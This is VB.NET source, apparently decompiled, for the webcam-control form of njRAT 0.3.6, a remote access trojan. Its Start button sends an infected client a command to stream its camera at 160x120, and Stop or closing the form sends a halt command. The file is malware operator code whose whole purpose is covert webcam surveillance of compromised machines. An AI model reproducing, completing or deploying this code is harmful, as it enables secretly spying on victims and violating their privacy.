Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class Cam
    Public osk As Client
    Public QQ As String
    Public sk As Client

    Public Sub New()
        Me.QQ = ""
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Start") Then
            Me.Button1.Text = "Stop"
            Me.sk.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(Me.ComboBox1.SelectedIndex), ind.Y, "160,120"}))
        Else
            Me.Button1.Text = "Start"
            Me.sk.Send("@")
        End If
    End Sub

    Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.sk.Send("@")
        Me.sk.CN = False
    End Sub

    Private Sub Cam_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.QQ = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Text = Me.QQ
        Me.Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
            Dim enumerator As IEnumerator
            Me.Timer1.Enabled = False
            Try
                enumerator = Me.Controls.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As Control = DirectCast(enumerator.Current, Control)
                    current.Enabled = False
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        ElseIf (Not Me.osk.CN Or Not Me.sk.CN) Then
            Dim enumerator2 As IEnumerator
            Me.Timer1.Enabled = False
            Try
                enumerator2 = Me.Controls.GetEnumerator
                Do While enumerator2.MoveNext
                    Dim control2 As Control = DirectCast(enumerator2.Current, Control)
                    control2.Enabled = False
                Loop
            Finally
                If TypeOf enumerator2 Is IDisposable Then
                    TryCast(enumerator2, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
End Class